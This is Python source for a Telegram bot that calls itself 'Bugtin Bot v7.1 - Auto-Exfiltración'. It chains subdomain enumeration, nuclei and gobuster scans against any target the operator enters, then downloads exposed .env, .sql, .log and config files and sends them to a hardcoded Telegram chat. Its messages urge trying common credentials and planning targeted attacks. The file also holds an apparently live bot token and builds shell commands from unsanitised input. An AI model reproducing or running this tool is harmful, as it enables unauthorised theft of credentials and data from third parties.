import telebot
from telebot import types
import subprocess
import os
import time
import re

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)

# --- MOTOR DE ANÁLISIS E IMPACTO ---
def analizar_y_explicar(archivo_reporte):
    impacto = "🔵 **ANÁLISIS DE IMPACTO**\n"
    instrucciones = "👉 **GUÍA DE ACCIÓN:**\n"
    
    with open(archivo_reporte, "r") as f:
        content = f.read().lower()

    if any(x in content for x in ["critical", "high", ".env", "config", "password", "aws_"]):
        impacto += "⚠️ **Nivel: CRÍTICO / ALTO**\nSe han detectado fugas de credenciales, llaves API o archivos de configuración críticos."
        instrucciones += "1. He intentado descargar los archivos automáticamente.\n2. Revisa los adjuntos; podrías encontrar accesos directos a bases de datos o servicios en la nube."
    elif any(x in content for x in ["200", "medium", "backup", ".sql", ".log"]):
        impacto += "⚠️ **Nivel: MEDIO**\nSe encontraron rutas con Status 200, respaldos o logs expuestos."
        instrucciones += "1. Analiza los archivos descargados.\n2. Si hay un panel de administración, intenta usar credenciales comunes o busca vulnerabilidades de bypass."
    else:
        impacto += "ℹ️ **Nivel: INFORMACIÓN**\nSolo se detectó información técnica y de infraestructura."
        instrucciones += "1. Usa esta información para planear un ataque más dirigido hacia versiones específicas del servidor."
    
    return impacto, instrucciones

# --- FUNCIÓN DE AUTO-EXFILTRACIÓN ---
def descargar_filtracion(url, chat_id):
    try:
        clean_url = url.strip()
        file_name = "exfil_" + clean_url.split("/")[-1].split(" ")[0].replace(":", "_").replace("?", "_")
        
        if not file_name or len(file_name) < 5: 
            file_name = f"exfil_data_{int(time.time())}.txt"

        # Descarga usando curl (-k para ignorar errores SSL)
        subprocess.run(f"curl -s -k -L {clean_url} -o {file_name}", shell=True)
        
        if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
            with open(file_name, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📥 **Archivo exfiltrado:**\n`{clean_url}`", parse_mode="Markdown")
            os.remove(file_name)
    except Exception as e:
        print(f"Error en exfiltración: {e}")

# --- MENÚ PRINCIPAL ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        help_text = (
            "🤖 **Bugtin Bot v7.1 - Auto-Exfiltración**\n\n"
            "📡 `/subs` - Reconocimiento de subdominios.\n"
            "🔓 `/archivos` - Escaneo con descarga automática de filtraciones.\n\n"
            "🚀 *El bot descargará automáticamente archivos .env, .sql, .log y más.*"
        )
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
        bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")

# --- LÓGICA: RECONOCIMIENTO ---
@bot.message_handler(commands=['subs'])
def start_subs(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        msg = bot.send_message(message.chat.id, "🎯 **Escribe el dominio objetivo:**")
        bot.register_next_step_handler(msg, process_subdomains_step)

def process_subdomains_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    bot.send_message(chat_id, f"🚀 Extrayendo subdominios de `{target}`...")
    output = "total_subs.txt"
    subprocess.run("rm -f s1.txt s2.txt total_subs.txt", shell=True)
    try:
        subprocess.run(f"subfinder -d {target} -o s1.txt -silent", shell=True)
        if os.path.exists("common.txt"):
            subprocess.run(f"gobuster dns --domain {target} --wordlist common.txt --quiet --output s2.txt", shell=True)
        subprocess.run(f"cat s1.txt s2.txt > {output} 2>/dev/null", shell=True)
        subprocess.run(f"sort -u {output} -o {output}", shell=True)
        if os.path.exists(output) and os.path.getsize(output) > 0:
            with open(output, "rb") as f:
                bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento completado: {target}")
        else:
            bot.send_message(chat_id, "❌ No se encontraron resultados.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- LÓGICA: AUDITORÍA Y EXFILTRACIÓN ---
@bot.message_handler(commands=['archivos'])
def start_archivos(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        msg = bot.send_message(message.chat.id, "🎯 **Introduce la URL o Subdominio:**")
        bot.register_next_step_handler(msg, process_vulns_step)

def process_vulns_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    report_file = f"rep_{target.replace('/', '_')}.txt"
    bot.send_message(chat_id, f"🔍 Auditando `{target}`...\n\nAnalizando y descargando filtraciones automáticamente.", parse_mode="Markdown")
    try:
        subprocess.run(f"nuclei -u {target} -tags exposure,cve,config,panel -o {report_file} -silent", shell=True)
        for wl in ["api-routes.txt", "logins.txt"]:
            if os.path.exists(wl):
                tmp = "tmp_sc.txt"
                subprocess.run(f"gobuster dir --url {target} --wordlist {wl} --quiet --output {tmp}", shell=True)
                if os.path.exists(tmp):
                    subprocess.run(f"cat {tmp} >> {report_file}", shell=True)
                    os.remove(tmp)
        if os.path.exists(report_file) and os.path.getsize(report_file) > 0:
            imp, gui = analizar_y_explicar(report_file)
            bot.send_message(chat_id, f"{imp}\n\n{gui}", parse_mode="Markdown")
            with open(report_file, "r") as f:
                for line in f:
                    if "http" in line and any(ext in line for ext in [".env", ".sql", ".log", ".json", ".conf", ".bak", ".old", ".yaml"]):
                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
                        if match:
                            url_found = match.group(0)
                            descargar_filtracion(url_found, chat_id)
            with open(report_file, "rb") as doc:
                bot.send_document(chat_id, doc, caption=f"📄 Reporte de auditoría: {target}")
        else:
            bot.send_message(chat_id, f"✅ No se detectaron filtraciones evidentes en `{target}`.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error en auditoría: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "📡 Solo Subdominios")
def btn_subs(m): start_subs(m)

@bot.message_handler(func=lambda m: m.text == "🔓 Buscar Archivos Expuestos")
def btn_arch(m): start_archivos(m)

print("🚀 Bugtin Bot v7.1 Online.")
bot.polling()
